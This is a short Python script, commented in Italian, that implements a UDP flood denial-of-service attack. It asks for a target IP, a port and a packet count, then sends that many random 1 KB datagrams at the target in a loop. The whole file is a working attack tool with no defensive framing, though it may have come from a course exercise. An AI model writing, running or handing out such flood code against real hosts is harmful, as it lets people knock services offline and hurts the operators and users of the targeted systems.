import socket
import random

def udp_flood():

    # Input dall'utente
    target_ip = input("Inserisci l'IP della macchina target:  ")
    target_port = int(input("Inserisci la porta UDP della macchina target:  "))
    num_packets = int(input("Inserisci il numero di pacchetti da 1 KB da inviare:  "))

    # Costruzione del pacchetto da 1 KB
    bytes_to_send = random._urandom(1024)     # Genera un pacchetto casuale di 1024 bites

    # Creazione del socket UDP
    client = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)

    print(f"Avviando invio di {num_packets} pacchetti verso {target_ip}: {target_port}...")

    for i in range(num_packets):
        try:
            client.sendto(bytes_to_send, (target_ip, target_port))
            print(f"Pacchetto {i + 1} inviato")
        except KeyboardInterrupt:
            print(f"\nInterrotto dall'utente.")
            break
        except Exception as e:
            print(f"Errore durante l'invio del pacchetto {i +1}: {e}")
            break
    
    print(f"UDP flood completato")

# Avvio del programma
if __name__ == "__main__":
    udp_flood()